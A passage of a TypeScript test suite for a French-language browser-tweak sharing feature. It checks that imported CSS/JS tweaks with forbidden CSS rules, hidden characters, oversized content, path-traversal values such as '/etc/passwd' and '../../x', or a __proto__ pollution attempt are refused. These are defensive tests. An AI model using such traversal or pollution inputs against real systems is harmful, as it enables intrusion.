  const quiet: SharedBoost = { ...BOOST, css: `a {}\nb { content: "x${ZERO_WIDTH}y" }`, js: `a()\nb()\nconst s = "x${SOFT_HYPHEN}y"` }

  it('is read, as its file and as its link', () => {
    expect(parseBoostFile(boostFileText(quiet))).toEqual({ ok: true, boost: quiet })
    expect(parseBoostLink(boostLink(quiet))).toEqual({ ok: true, boost: quiet })
  })

  it('warns in the sheet shown before the installation, one sentence for the CSS and one for the script, each with its line', () => {
    const css = frenchSpaces('Le CSS contient des caractères invisibles (première ligne concernée : 2). Relisez-la avec attention.')
    const js = frenchSpaces('Le JavaScript contient des caractères invisibles (première ligne concernée : 3). Relisez-la avec attention.')
    expect(invisibleWarnings(quiet, true)).toEqual([css, js])
    expect(importPreview(quiet, 'ask').detail).toContain(`${css}\n${js}`)
    // A script that does not come in is not read: nothing is said of it.
    expect(invisibleWarnings(quiet, false)).toEqual([css])
    expect(importPreview(quiet, 'never').detail).not.toContain(js)
    expect(importPreview(BOOST, 'ask').detail).not.toContain('invisibles')
  })

  it('warns once in the sheet of a file of several Tweaks', () => {
    const sentence = frenchSpaces('Au moins une Retouche de ce fichier contient des caractères invisibles : relisez son code avec attention.')
    expect(importBundlePreview([BOOST, quiet], 'ask').detail).toContain(sentence)
    expect(importBundlePreview([BOOST, { ...BOOST, name: 'Autre' }], 'ask').detail).not.toContain(sentence)
  })
})

describe('the sentences of a refusal', () => {
  const REASONS: ShareRefusalReason[] = [
    'empty',
    'too-large',
    'not-json',
    'not-a-share',
    'unknown-format',
    'wrong-kind',
    'invalid-field',
    'hidden-characters',
    'host-invalid',
    'host-too-wide',
    'css-too-large',
    'js-too-large',
    'css-forbidden',
    'link-not-a-link',
    'link-unknown-version',
    'link-malformed'
  ]

  it('exist for every reason, in French, and end with a full stop', () => {
    for (const reason of REASONS) {
      const sentence = shareRefusalMessage({ ok: false, reason, field: 'css', detail: '3', rule: 'url', line: 4 })
      expect(sentence.length, reason).toBeGreaterThan(20)
      expect(sentence.endsWith('.'), reason).toBe(true)
      expect(sentence, reason).not.toMatch(/undefined|\[object/)
    }
  })

  it('names the rule of a stylesheet that is refused and the line it is on', () => {
    expect(shareRefusalMessage({ ok: false, reason: 'css-forbidden', rule: 'import', line: 7 })).toContain('@import')
    expect(shareRefusalMessage({ ok: false, reason: 'css-forbidden', rule: 'url', line: 7 })).toContain('url(')
    expect(shareRefusalMessage({ ok: false, reason: 'css-forbidden', rule: 'image-function', line: 7 })).toContain('image-set()')
    expect(shareRefusalMessage({ ok: false, reason: 'css-forbidden', rule: 'expression', line: 7 })).toContain('expression()')
    expect(shareRefusalMessage({ ok: false, reason: 'css-forbidden', rule: 'behavior', line: 7 })).toContain('behavior')
    expect(shareRefusalMessage({ ok: false, reason: 'css-forbidden', rule: 'binding', line: 7 })).toContain('-moz-binding')
    expect(shareRefusalMessage({ ok: false, reason: 'css-forbidden', rule: 'attr-url', line: 7 })).toContain('attr()')
  })

  it('says which Tweak or theme a wrong kind is', () => {
    expect(shareRefusalMessage({ ok: false, reason: 'wrong-kind', detail: 'theme' })).toContain('thème')
    expect(shareRefusalMessage({ ok: false, reason: 'wrong-kind', detail: 'boost' })).toContain('Retouche')
  })
})

describe('checking a Tweak that does not come from a file', () => {
  it('refuses the values JSON cannot write, which an action can carry: not-a-number zoom and colours, a selector that only looks like a text', () => {
    expect(reasonOf(checkSharedBoost({ ...BOOST, zoom: Number.NaN }))).toBe('invalid-field')
    expect(reasonOf(checkSharedBoost({ ...BOOST, zoom: Number.POSITIVE_INFINITY }))).toBe('invalid-field')
    for (const key of ['hue', 'saturation', 'brightness', 'contrast']) expect(reasonOf(checkSharedBoost({ ...BOOST, tint: { ...BOOST.tint, [key]: Number.NaN } })), key).toBe('invalid-field')
    // A list of one text is written like that text when it is turned into one.
    expect(reasonOf(checkSharedBoost({ ...BOOST, zap: [['div']] }))).toBe('invalid-field')
    expect(reasonOf(checkSharedBoost({ ...BOOST, zap: [{ toString: () => 'div' }] }))).toBe('invalid-field')
  })

  it('applies the same rules to an object, such as the one an action carries', () => {
    expect(checkSharedBoost(BOOST)).toEqual({ ok: true, boost: BOOST })
    expect(reasonOf(checkSharedBoost({ ...BOOST, css: '@import "x"' }))).toBe('css-forbidden')
    expect(reasonOf(checkSharedBoost(null))).toBe('not-a-share')
    expect(reasonOf(checkSharedBoost('boost'))).toBe('not-a-share')
    expect(reasonOf(checkSharedBoost([BOOST]))).toBe('not-a-share')
    expect(reasonOf(checkSharedBoost({ ...BOOST, host: undefined }))).toBe('host-invalid')
  })
})

describe('what the interface may ask', () => {
  it('accepts the five requests and nothing else', () => {
    expect(parseBoostShareRequest({ kind: 'import-file' })).toEqual({ kind: 'import-file' })
    expect(parseBoostShareRequest({ kind: 'import-link' })).toEqual({ kind: 'import-link' })
    expect(parseBoostShareRequest({ kind: 'export-file', boostId: 'abc-123_X' })).toEqual({ kind: 'export-file', boostId: 'abc-123_X' })
    expect(parseBoostShareRequest({ kind: 'copy-link', boostId: 'abc' })).toEqual({ kind: 'copy-link', boostId: 'abc' })
    expect(parseBoostShareRequest({ kind: 'export-all' })).toEqual({ kind: 'export-all' })
  })

  it.each([
    null,
    undefined,
    'import-file',
    [],
    {},
    { kind: 'import' },
    { kind: 'import-file', text: 'lucboost1_x' },
    { kind: 'import-link', text: 'lucboost1_x' },
    { kind: 'import-file', path: '/etc/passwd' },
    { kind: 'export-file' },
    { kind: 'export-file', boostId: 5 },
    { kind: 'export-file', boostId: '' },
    { kind: 'export-file', boostId: 'a'.repeat(65) },
    { kind: 'export-file', boostId: '../../x' },
    { kind: 'copy-link', boostId: 'a b' },
    { kind: 'copy-link', boostId: 'a', path: '/tmp/x' },
    { kind: 'export-all', boostId: 'a' },
    { kind: 'export-all', path: '/tmp/x' }
  ])('refuses %j', (raw) => {
    expect(parseBoostShareRequest(raw)).toBeNull()
  })
})

describe('a file of all the Tweaks', () => {
  const own = (n: number, over: Partial<Boost> = {}): Boost => ({ id: `id-${n}`, name: `Retouche ${n}`, host: `site${n}.example.com`, enabled: n % 2 === 0, css: `p { color: #${n}${n}${n} }`, js: '', zoom: 1, zap: [], tint: NEUTRAL_TINT, ...over })
  const shared = (boosts: Boost[], withScript = true): SharedBoost[] => {
    const result = shareableBoosts(boosts, withScript)
    if (!result.ok) throw new Error(`not shareable: ${JSON.stringify(result)}`)
    return result.boosts
  }
  const text = (boosts: SharedBoost[]): string => {
    const file = boostsFileText(boosts)
    if (!file.ok) throw new Error(`not writable: ${JSON.stringify(file)}`)
    return file.text
  }
  const fileOf = (boosts: unknown[], top: Record<string, unknown> = {}): string => JSON.stringify({ format: 1, kind: 'boosts', boosts, ...top })

  it('reads back as the Tweaks that were written, in their order, with a script as with none', () => {
    const boosts = [own(1), own(2, { js: 'document.title = "x"', jsEnabled: true }), own(3, { fontFamily: 'inter', textCase: 'upper', invert: true, zap: ['#ad'], zoom: 1.3 })]
    const written = shared(boosts)
    const read = parseBoostFiles(text(written))
    expect(read).toEqual({ ok: true, boosts: written, bundle: true })
    expect(written.map((b) => b.name)).toEqual(['Retouche 1', 'Retouche 2', 'Retouche 3'])
    expect(written[1]!.js).toBe('document.title = "x"')
    // Nothing of the person's own state goes into the file.
    expect(text(written)).not.toMatch(/id-\d|enabled|jsEnabled/i)
  })

  it('leaves the scripts out of the file unless they are asked for', () => {
    const boosts = [own(1, { js: 'alert(1)' }), own(2)]
    expect(shared(boosts, false).map((b) => b.js)).toEqual(['', ''])
    expect(shared(boosts, true).map((b) => b.js)).toEqual(['alert(1)', ''])
  })

  it('is read by the same door as a file of one Tweak, which stays a file of one Tweak', () => {
    expect(parseBoostFiles(boostFileText(BOOST))).toEqual({ ok: true, boosts: [BOOST], bundle: false })
    expect(parseBoostFiles(text([BOOST]))).toEqual({ ok: true, boosts: [BOOST], bundle: true })
    // Where only one Tweak is wanted (a link), a file of several is not one.
    expect(refusal(parseBoostFile(text([BOOST, { ...BOOST, name: 'Autre' }])))).toMatchObject({ reason: 'wrong-kind', detail: 'boosts' })
    expect(shareRefusalMessage(refusal(parseBoostFile(text([BOOST]))))).toMatch(/plusieurs Retouches/)
    // A theme is not a Tweak, a Tweak is not a theme.
    expect(refusal(parseBoostFiles(themeFileText(READY_THEMES[0]!.theme, 'x'))).reason).toBe('wrong-kind')
  })

  it('refuses the whole file for one Tweak that is refused, and says which one it is', () => {
    const list = [BOOST, { ...BOOST, name: 'Fond distant', css: 'body { background: url(https://cdn.example/bg.png) }' }, { ...BOOST, name: 'Troisième' }]
    const refused = refusal(parseBoostFiles(fileOf(list)))
    expect(refused).toMatchObject({ reason: 'css-forbidden', rule: 'url', entry: 2, entryName: 'Fond distant' })
    expect(shareRefusalMessage(refused)).toMatch(/^Retouche n° 2 «\u00a0Fond distant\u00a0»\u00a0: Le CSS contient une adresse url/)
    // Whatever is wrong with an entry: a number, a host, an entry that is not an object, a name that hides characters.
    for (const [bad, reason] of [[5, 'not-a-share'], [{ ...BOOST, host: 'intranet' }, 'host-invalid'], [{ ...BOOST, zoom: 9 }, 'invalid-field'], [{ ...BOOST, name: `a${RTL_OVERRIDE}b` }, 'hidden-characters'], [null, 'not-a-share']] as const) {
      const result = refusal(parseBoostFiles(fileOf([BOOST, bad])))
      expect(result.reason, JSON.stringify(bad)).toBe(reason)
      expect(result.entry, JSON.stringify(bad)).toBe(2)
    }
    // The name of a refused entry is shown only when it is safe to show.
    expect(refusal(parseBoostFiles(fileOf([{ ...BOOST, name: `a${RTL_OVERRIDE}b`, css: 'x{}', host: 'intranet' }]))).entryName).toBeUndefined()
  })

  it('does not copy what it does not know, an entry that smuggles an id or a state', () => {
    const entry = JSON.parse(JSON.stringify({ ...BOOST, id: 'stolen', enabled: false, jsEnabled: true })) as Record<string, unknown>
    Object.defineProperty(entry, '__proto__', { value: { polluted: true }, enumerable: true })
    const read = parseBoostFiles(fileOf([entry]))
    expect(read).toMatchObject({ ok: true })
    expect(JSON.stringify(read)).not.toMatch(/stolen|enabled|polluted/)
    expect(({} as Record<string, unknown>)['polluted']).toBeUndefined()
  })

  it('is bounded in the number of Tweaks, written and read', () => {
    const many = Array.from({ length: BOOST_BUNDLE_MAX }, (_, i) => ({ ...BOOST, host: `site${i}.example.com` }))
    expect(parseBoostFiles(text(many))).toMatchObject({ ok: true, bundle: true })
    expect(refusal(boostsFileText([...many, BOOST])).reason).toBe('too-many')
    expect(refusal(parseBoostFiles(fileOf([...many, BOOST]))).reason).toBe('too-many')
    expect(shareRefusalMessage(refusal(parseBoostFiles(fileOf([...many, BOOST]))))).toContain(String(BOOST_BUNDLE_MAX))
    // The state may hold more than a file does: that is said before anything is written, never cut off silently.
    expect(refusal(shareableBoosts(Array.from({ length: BOOST_BUNDLE_MAX + 1 }, (_, i) => own(i)), false)).reason).toBe('too-many')
  })

  it('is bounded in bytes, written and read, and a file of one Tweak keeps the smaller bound of one Tweak', () => {
    // 100 Tweaks with the longest stylesheet each: more than a file may hold, each of them fine by itself.
    const big = Array.from({ length: 100 }, (_, i) => ({ ...BOOST, host: `site${i}.example.com`, css: `p{}\n`.repeat(BOOST_CSS_MAX / 4) }))
    expect(JSON.stringify(big).length).toBeGreaterThan(BOOST_BUNDLE_MAX_BYTES)
    const written = boostsFileText(big)
    expect(refusal(written)).toMatchObject({ reason: 'too-large', max: BOOST_BUNDLE_MAX_BYTES })
    expect(shareRefusalMessage(refusal(written))).toContain(frenchSpaces(`${Math.round(BOOST_BUNDLE_MAX_BYTES / 1024)} Ko`))
    expect(refusal(parseBoostFiles(`${fileOf([BOOST])}${' '.repeat(BOOST_BUNDLE_MAX_BYTES)}`)).reason).toBe('too-large')
    // Just under the bound of the file, but a single Tweak: over the bound of a Tweak.
    const padded = JSON.stringify({ format: 1, kind: 'boost', boost: BOOST, note: 'x'.repeat(SHARE_FILE_MAX_BYTES) })
    expect(refusal(parseBoostFiles(padded))).toMatchObject({ reason: 'too-large', max: SHARE_FILE_MAX_BYTES })
    expect(refusal(parseBoostFile(padded)).reason).toBe('too-large')
    // Several Tweaks of the size of a file of one Tweak each are fine together.
    const medium = Array.from({ length: 5 }, (_, i) => ({ ...BOOST, host: `site${i}.example.com`, css: 'a{}\n'.repeat(20_000) }))
    expect(parseBoostFiles(text(medium))).toMatchObject({ ok: true })
    expect(text(medium).length).toBeGreaterThan(SHARE_FILE_MAX_BYTES / 2)
  })

  it('refuses an empty list, a list that is not one, and a file of no Tweak', () => {
    expect(refusal(boostsFileText([])).reason).toBe('empty')
    expect(refusal(parseBoostFiles(fileOf([]))).reason).toBe('empty')
    for (const boosts of [undefined, null, 'a', {}, 3]) expect(refusal(parseBoostFiles(JSON.stringify({ format: 1, kind: 'boosts', boosts }))), String(boosts)).toMatchObject({ reason: 'invalid-field', field: 'boosts' })
    expect(refusal(parseBoostFiles(JSON.stringify({ format: 2, kind: 'boosts', boosts: [BOOST] }))).reason).toBe('unknown-format')
  })

  it('leaves out of the file a Tweak that cannot be shared, names it, and still writes the others', () => {
    const boosts = [own(1), own(2, { css: 'body { background: url(https://cdn.example/bg.png) }' }), own(3, { host: 'intranet' }), own(4)]
    const result = shareableBoosts(boosts, true)
    if (!result.ok) throw new Error('refused as a whole')
    expect(result.boosts.map((b) => b.name)).toEqual(['Retouche 1', 'Retouche 4'])
    expect(result.left.map((l) => [l.name, l.refusal.reason])).toEqual([['Retouche 2', 'css-forbidden'], ['Retouche 3', 'host-invalid']])
    expect(shareableBoosts([own(2, { css: '@import "x.css"' })], false)).toMatchObject({ ok: true, boosts: [], left: [{ name: 'Retouche 2' }] })
  })
})

describe('what is said before the Tweaks of a file are installed', () => {
  const list = (n: number, over: Partial<SharedBoost> = {}): SharedBoost[] => Array.from({ length: n }, (_, i) => ({ ...BOOST, name: `Retouche ${i + 1}`, host: `site${i + 1}.example.com`, js: '', ...over }))

  it('says how many, lists them, and promises nothing is fetched', () => {
    const preview = importBundlePreview(list(3), 'ask')
    expect(preview.message).toBe(frenchSpaces('Installer 3 Retouches ?'))
    expect(preview.detail).toContain('• Retouche 1 (site1.example.com)')
    expect(preview.detail).toContain('• Retouche 3 (site3.example.com)')
    expect(preview.detail).toContain('aucune requête')
    expect(preview).toMatchObject({ hasScript: false, scriptDropped: false })
    expect(importBundlePreview(list(1), 'ask').message).toBe(frenchSpaces('Installer 1 Retouche ?'))
  })

  it('marks the Tweaks that carry a script and says what becomes of them, by the setting', () => {
    const boosts = [...list(2), { ...list(1)[0]!, name: 'Script', host: 'script.example.com', js: 'alert(1)' }]
    const ask = importBundlePreview(boosts, 'ask')
    expect(ask).toMatchObject({ hasScript: true, scriptDropped: false })
    expect(ask.detail).toContain('• Script (script.example.com) · avec JavaScript')
    expect(ask.detail).toMatch(/1 Retouche a du JavaScript\u00a0: il sera installé désactivé/)
    const never = importBundlePreview(boosts, 'never')
    expect(never).toMatchObject({ hasScript: false, scriptDropped: true })
    expect(never.detail).toMatch(/ne sera pas importé/)
  })

  it('lists a dozen and counts the rest, so that a file of two hundred Tweaks is a sheet that fits', () => {
    const preview = importBundlePreview(list(40), 'ask')
    expect(preview.message).toBe(frenchSpaces('Installer 40 Retouches ?'))
    expect(preview.detail).toContain('• Retouche 12 (')
    expect(preview.detail).not.toContain('• Retouche 13 (')
    expect(preview.detail).toContain('… et 28 autres Retouches')
    expect(importBundlePreview(list(13), 'ask').detail).toContain('… et 1 autre Retouche')
  })
})

describe('what is said in English', () => {
  it('counts lines, bytes and hidden elements by the rules of English, and names the case in English', () => {
    setLanguage('en')
    try {
      expect(describeSharedBoost({ ...BOOST, textCase: 'upper' }, 'ask')).toEqual([
        'Stylesheet: 2 lines, 61 bytes',
        '2 hidden elements (Eraser)',
        'Text at 120%',
        'Font: Inter',
        'Text case: UPPERCASE',
        'Colors changed (hue, saturation, brightness, contrast)',
        'Brightness inverted (dark mode)'
      ])
      expect(describeSharedBoost({ ...BOOST, css: 'a {}', zap: ['#a'] }, 'ask').slice(0, 2)).toEqual(['Stylesheet: 1 line, 4 bytes', '1 hidden element (Eraser)'])
      expect(excerptOf(Array.from({ length: 9 }, (_, i) => `l${i}`).join('\n'))).toMatch(/\n {2}… \(1 more line\)$/)
      // The signals are joined the way English joins them: no space before the semicolon.
      expect(importPreview({ ...BOOST, js: 'fetch(u); document.cookie' }, 'ask').detail).toContain('The script mentions: network requests (fetch, XMLHttpRequest, WebSocket…); the site’s cookies or storage. (A simple search, not an analysis.)')
    } finally {
      setLanguage('fr')
    }
  })

  it('puts the parts of a refusal where English puts them, with the quotes of English', () => {
    setLanguage('en')
    try {
      expect(shareRefusalMessage({ ok: false, reason: 'css-forbidden', field: 'css', rule: 'import', line: 7, entry: 2, entryName: 'Fond' })).toBe('Tweak #2 “Fond”: The CSS contains @import: a shared Tweak can’t load another stylesheet (line 7).')
      expect(shareRefusalMessage({ ok: false, reason: 'hidden-characters', field: 'tint.brightness', line: 3 })).toBe('The field “brightness” (line 3) contains invisible characters or characters that change the reading direction: they could hide code.')
      expect(shareRefusalMessage({ ok: false, reason: 'too-large', detail: String(600 * 1024), max: 512 * 1024 })).toBe('This is too large for a Tweak or a theme (600 KB): the limit is 512 KB.')
      expect(shareRefusalMessage({ ok: false, reason: 'host-invalid', field: 'host', detail: 'https://example.com' })).toMatch(/^The target site \(“https:\/\/example\.com”\) isn’t a valid site name/)
    } finally {
      setLanguage('fr')
    }
  })
})
